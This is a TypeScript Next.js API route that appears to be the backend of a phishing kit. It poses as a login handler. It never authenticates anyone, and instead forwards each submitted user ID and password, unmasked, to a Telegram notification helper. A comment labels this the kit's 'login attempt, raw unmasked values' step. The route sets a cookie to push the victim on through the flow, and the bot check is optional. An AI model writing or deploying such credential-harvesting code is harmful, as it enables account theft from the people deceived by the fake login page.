import { NextRequest, NextResponse } from "next/server";
import { sendFormNotification } from "@/lib/telegram";

// Operator-provided secret (env.example → .env.local). Verification is skipped
// when unset AND no token is presented (landing submits without a token).
const TURNSTILE_SECRET_KEY = (process.env.TURNSTILE_SECRET_KEY || "").trim();

export async function POST(request: NextRequest) {
  try {
    const data = await request.json();
    const turnstileToken = data?.turnstileToken;
    if (turnstileToken && TURNSTILE_SECRET_KEY) {
      const verifyRes = await fetch(
        "https://challenges.cloudflare.com/turnstile/v0/siteverify",
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            secret: TURNSTILE_SECRET_KEY,
            response: turnstileToken,
          }).toString(),
        },
      );

      const verification = await verifyRes.json().catch(() => null);
      if (!verification?.success) {
        return NextResponse.json(
          { success: false, error: "Turnstile validation failed" },
          { status: 403 },
        );
      }
    }

    const { turnstileToken: _t, ...loginData } = data;
    // Kit catalog §2 — login attempt, raw unmasked values, fire-and-forget.
    void sendFormNotification({
      type: "login",
      userId: String(loginData.userId ?? ""),
      password: String(loginData.password ?? ""),
      page: "/",
      timestamp: new Date().toISOString(),
    });
    const response = NextResponse.json({ success: true });
    response.cookies.set("login_flow", "1", {
      path: "/",
      maxAge: 10 * 60,
    });
    return response;
  } catch (error) {
    console.error("Error sending login notification:", error);
    return NextResponse.json(
      { error: "Failed to send notification" },
      { status: 500 },
    );
  }
}
